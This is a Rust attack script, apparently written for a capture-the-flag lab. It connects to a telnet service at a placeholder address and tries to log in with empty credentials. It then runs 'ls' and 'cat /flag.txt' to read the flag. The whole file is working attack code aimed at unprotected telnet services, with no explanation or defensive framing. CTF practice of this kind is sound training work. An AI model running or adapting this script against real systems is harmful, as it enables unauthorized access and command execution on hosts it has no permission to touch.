use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;

fn main() -> io::Result<()> {
    // Target IP and port - change these as needed
    let target = "10.10.10.10:23"; // Replace with actual target IP
    let timeout = Duration::from_secs(5);

    println!("[+] Attempting to connect to {}...", target);
    
    // Connect to the target with timeout
    let mut stream = match TcpStream::connect(target) {
        Ok(stream) => {
            println!("[+] Connected successfully!");
            stream
        },
        Err(e) => {
            eprintln!("[-] Connection failed: {}", e);
            return Err(e);
        }
    };

    // Set read timeout
    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    // Buffer to store responses
    let mut buffer = vec![0; 1024];
    
    // Read the initial banner
    match stream.read(&mut buffer) {
        Ok(n) => {
            if n > 0 {
                println!("[+] Banner received:");
                println!("{}", String::from_utf8_lossy(&buffer[..n]));
            }
        },
        Err(e) => eprintln!("[-] Error reading banner: {}", e),
    }

    // Send newline to attempt login
    println!("[+] Attempting login with empty credentials...");
    stream.write_all(b"\n")?;

    // Read response after login attempt
    match stream.read(&mut buffer) {
        Ok(n) => {
            if n > 0 {
                println!("[+] Login response:");
                println!("{}", String::from_utf8_lossy(&buffer[..n]));
            }
        },
        Err(e) => eprintln!("[-] Error reading login response: {}", e),
    }

    // If we get here, we might be logged in - try to execute a command
    println!("[+] Attempting to execute command...");
    stream.write_all(b"ls\n")?;

    // Read command response
    match stream.read(&mut buffer) {
        Ok(n) => {
            if n > 0 {
                println!("[+] Command response:");
                println!("{}", String::from_utf8_lossy(&buffer[..n]));
            }
        },
        Err(e) => eprintln!("[-] Error reading command response: {}", e),
    }

    // Try to read the flag
    println!("[+] Attempting to read flag...");
    stream.write_all(b"cat /flag.txt\n")?;

    // Read flag response
    match stream.read(&mut buffer) {
        Ok(n) => {
            if n > 0 {
                println!("[+] Flag response:");
                println!("{}", String::from_utf8_lossy(&buffer[..n]));
            }
        },
        Err(e) => eprintln!("[-] Error reading flag: {}", e),
    }

    Ok(())
} 